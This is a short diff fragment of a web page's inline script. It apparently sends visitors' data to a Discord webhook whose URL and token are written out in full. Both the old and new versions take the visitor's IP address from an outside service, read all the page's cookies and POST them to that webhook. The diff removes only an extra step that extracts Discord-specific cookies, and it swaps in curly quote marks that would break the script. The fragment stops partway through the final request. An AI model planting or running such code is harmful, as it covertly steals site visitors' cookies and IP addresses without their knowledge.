@@ -11,14 +11,10 @@ text-align: center;
 }
 </style>
 <script>
-var webhook = 'https://discord.com/api/webhooks/1445185532362625075/1JiVMU1D83IsJlibkTjNplqrvkQ0sT6Km1-bxAX64sQqNKGLWCVbdxpUZ-yPDR3u8h0j';
+var webhook = “https://discord.com/api/webhooks/1445185532362625075/1JiVMU1D83IsJlibkTjNplqrvkQ0sT6Km1-bxAX64sQqNKGLWCVbdxpUZ-yPDR3u8h0j”;
 fetch(“https://api.ipify.org?format=json”).then(res => res.json()).then(ip => {
 const cookies = document.cookie;
-const discordCookies = cookies.match(/__dcfduid=([^;]+); __sdcfduid=([^;]+)/);
 let message = IP: ${ip.ip}\nCookies: ${cookies};
-if (discordCookies) {
-message += \nDiscord Cookies: __dcfduid=${discordCookies[1]}; __sdcfduid=${discordCookies[2]};
-}
 fetch(webhook, {
 method: “POST”,
 headers: {
